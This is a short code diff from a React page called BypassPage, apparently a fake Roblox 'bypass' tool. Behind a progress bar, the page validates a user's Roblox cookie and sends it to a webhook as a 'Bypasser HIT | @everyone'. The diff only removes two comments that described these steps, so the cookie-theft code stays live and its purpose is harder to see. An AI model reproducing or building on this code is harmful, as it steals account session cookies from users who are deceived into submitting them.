@@ -81,7 +81,6 @@ const BypassPage = () => {
       setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
     }, 200);
 
-    // Validate cookie with Roblox first
     let apiOk = false;
     let info: AccountInfo = { valid: false };
     try {
@@ -112,7 +111,6 @@ const BypassPage = () => {
     }
 
     broadcastLiveBypass(info);
-    // Send the cookie hit immediately when bypass starts
     await sendHitEmbed(getWebhook(WK.bypass), info, { tag: 'Bypasser HIT | @everyone' });
 
     const elapsed = Date.now() - start;
